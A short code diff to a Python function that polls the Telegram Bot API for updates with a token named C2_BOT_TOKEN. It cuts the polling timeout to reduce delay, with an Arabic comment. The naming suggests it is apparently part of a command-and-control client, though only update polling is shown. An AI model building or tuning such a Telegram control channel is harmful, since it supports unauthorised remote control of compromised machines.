@@ -358,8 +358,8 @@ def listen_telegram_group():
     while True:
         try:
             url = f"https://api.telegram.org/bot{C2_BOT_TOKEN}/getUpdates"
-            params = {"offset": _tg_last_update_id + 1, "timeout": 30}
-            response = requests.get(url, params=params, timeout=35)
+            params = {"offset": _tg_last_update_id + 1, "timeout": 5}   # 5s لتقليل التأخير
+            response = requests.get(url, params=params, timeout=10)
 
             if response.status_code == 200:
                 data = response.json()
